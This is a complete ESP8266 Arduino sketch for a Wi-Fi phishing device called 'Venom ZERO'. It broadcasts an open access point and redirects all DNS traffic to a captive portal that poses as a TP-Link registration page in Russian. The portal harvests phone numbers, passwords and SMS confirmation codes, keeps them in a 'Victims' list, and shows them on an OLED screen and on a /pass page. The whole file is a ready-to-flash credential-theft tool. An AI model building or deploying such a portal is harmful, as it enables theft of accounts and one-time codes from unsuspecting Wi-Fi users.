//nodeMCU 
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h>
#include "SSD1306Wire.h"   

SSD1306Wire display(0x3c, SDA, SCL);  
#define SSID_NAME "Power_5G"
#define SUBTITLE "Добро пожаловать в TP-Link."
#define TITLE "Регистрация:"
#define BODY "Создайте аккаунт, чтобы пользоваться супер-быстрым интернетом."
#define POST_TITLE "Ожидайте..."
#define POST_BODY "<form action=/post method=post><b> Код из SMS:   </b> <center> <input  type=text name=pcode type=number placeholder='' minlength=3 required></center><center><input type=submit  style=background:#08B794;font-size:17px;color:white;cursor:pointer;  value=\"Войти\"></center></form>"
#define PASS_TITLE "Victims"
#define CLEAR_TITLE "Cleared"


const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
String email = "";
String loggg = "";
String password = "";
IPAddress APIP(172, 0, 0, 1);

String Victims = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}

String footer() {
  return
    "<br><footer><div><center><p>Copyright&#169; 2019-2024 | All rights reserved.</p></center></div></footer>";
}
String oledshow(String inf) {
  display.clear();
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 1, inf); 
  display.display();
  return inf;
}
String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input{ width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 2px solid #08B794; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #08B794; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               " input{width: 100%;border-box border: 2px solid red;border-radius: 4px}";
  String h = "<!DOCTYPE html><html><meta charset = \"utf-8\">"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div>";
  return h;
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b> Номер телефона:   </b> <center> <input  type=tel autocomplete=email name=email placeholder=+7 minlength=10 required></center>" +
         "<b> Придумайте пароль:</b> <center> <input type=password name=password1 placeholder='Новый пароль' minlength=7 required></center>" +
         "<b> Повторите пароль:</b> <center> <input type=password name=password2 placeholder='Новый пароль' minlength=7 required></center>" +
         "<center><input type=submit  style=background:#08B794;font-size:17px;color:white;cursor:pointer;  value=\"Продолжить\" onclick=\"return checkPasswords()\"></center></form>" + footer() +
         "<script> function checkPasswords() { var password1 = document.getElementsByName('password1')[0].value; var password2 = document.getElementsByName('password2')[0].value; if (password1 !== password2) { alert('Пароли не совпадают'); return false; } return true; } </script>";
}



String posted() {
  
  String email = input("email");
  String password = input("password1");
  String pcode = input("pcode");
  //display.setFont(ArialMT_Plain_24);
  //display.drawString(0, 10, "Телефон: "+email+"\nПароль:"+password);
  //display.display(); 
  if(pcode != ""){
    loggg = "SMS code: "+pcode+"\n"+loggg;
    display.clear();
    display.setFont(ArialMT_Plain_10);
    display.drawString(0, 1, "SMS code: "+pcode); 
    display.display();
    Victims = "<li><b>Код: "+ pcode +"</b></li>" + Victims;
  }if(email != ""){
    loggg =  "Phone: "+email+"\n"+loggg;
    display.clear();
    display.setFont(ArialMT_Plain_10);
    display.drawString(0, 1, "Phone: "+email);
    display.display();
    Victims = "<li>Телефон:  <b>" + email + "</b></br>Пароль:  <b style=color:#ea5455;>" + password + "</b></li>" + Victims;
  }
  display.clear(); 
  return header(POST_TITLE) + POST_BODY + footer();
}
String post_setting() {
  return  "<meta charset = \"utf-8\"><meta name=viewport content=\"width=device-width,initial-scale=1\"><div><form action=/settin method=post><b>Новое название SSID: </b> <center> <input type=text name=newssid minlength=3 required></center><center><input type=submit  style=background:#08B794;font-size:17px;color:white;cursor:pointer;  value=\"Изменить\"></center></form><br>"+Victims;
}
String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Victims = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>The Victims list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { 
  int count = 1;
  //display.clear();
  display.setFont(ArialMT_Plain_16);
  display.drawString(10, 25, "\n\n\n  * New log *  "); 
  display.display();
  while (count <= 2) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(200);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(200);
    count = count + 1;
  }
  display.clear(); 
}
void setup() {
  
  display.init();
  display.flipScreenVertically(); 
  display.clear(); 

  display.setFont(ArialMT_Plain_10);
  display.drawString(10, 16, "\n\n# Venom ZERO {v.1.1}\nServer: 172.0.0.1\nPage: /settin");               
  display.display();

  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); 
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();

  });
  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
    webServer.on("/settin", []() {
    webServer.send(HTTP_CODE, "text/html", post_setting());
    BLINK();

  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}
void loop() {   
  display.setFont(ArialMT_Plain_10);                        
  display.drawString(0, 0, loggg);               
  display.display();
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest(); webServer.handleClient();
  if (webServer.hasArg("newssid")) {
    String newSSID = input("newssid");
    WiFi.softAPdisconnect(true);
    delay(1000);
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(newSSID);
  }
}
